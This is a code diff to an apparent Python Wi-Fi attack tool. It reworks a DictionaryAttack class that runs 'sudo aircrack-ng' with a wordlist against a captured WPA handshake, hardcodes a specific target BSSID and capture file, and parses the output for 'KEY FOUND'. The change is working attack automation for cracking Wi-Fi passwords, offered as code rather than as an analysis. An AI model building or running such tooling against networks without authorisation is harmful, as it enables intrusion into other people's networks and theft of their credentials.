@@ -14,7 +14,7 @@ class BruteForceAttack(AbstractAttack):
         pass
 
 class DictionaryAttack(AbstractAttack):
-    __word_list = list()
+    __path_dict = 'Model/files/handshake'
 
     @classmethod
     def attack_name(cls) -> str:
@@ -26,38 +26,26 @@ class DictionaryAttack(AbstractAttack):
         '''
         Attempts to crack the captured hash containing the password with a dictionary attack using the Aircrack tool 
         '''
-        cmd = ['aircrack-ng',
-            '-w', cls.word_list, #TODO create/upload dictionary file
+        target.bssid = 'E8:DE:27:B0:14:C9' #TODO
+        target_dump = 'Model/files/handshake' #TODO
+        cmd = ['sudo',
+            'aircrack-ng',
+            '-w', cls.__path_dict, #TODO create/upload dictionary file
             '-b', target.bssid,
             target_dump + "-01.cap"]
         
         result = sb.Popen(cmd, stdout=sb.PIPE, universal_newlines=True)
-        
-        for stdout_line in iter(result.stdout.readline, ""):
-            """
-            if stdout_line.find('No valid WPA handshake found'):
-                raise StopIteration(True)
-            elif stdout_line.find('KEY FOUND'):
-                raise StopIteration(True)
-            """
-            raise StopIteration(True)
-            yield stdout_line 
+        output = result.stdout.read()
+
+        if output.find('No valid WPA handshakes found') != -1:
+            yield 'No valid WPA handshakes found'
+        elif output.find('KEY FOUND') != -1:
+            yield 'KEY FOUND'
+        elif output.find('KEY NOT FOUND') != -1:
+            yield 'KEY NOT FOUND'
 
         result.stdout.close()
         return_code = result.wait()
 
         if return_code:
             raise sb.CalledProcessError(return_code, cmd)
-
-        """"
-        if return_code:
-            raise sb.CalledProcessError(return_code, cmd)
-
-        if output.stdout.find('No valid WPA handshakes found'):
-            return False 
-
-        if output.stdout.find('KEY FOUND'):
-            return True
-
-        return False
-"""
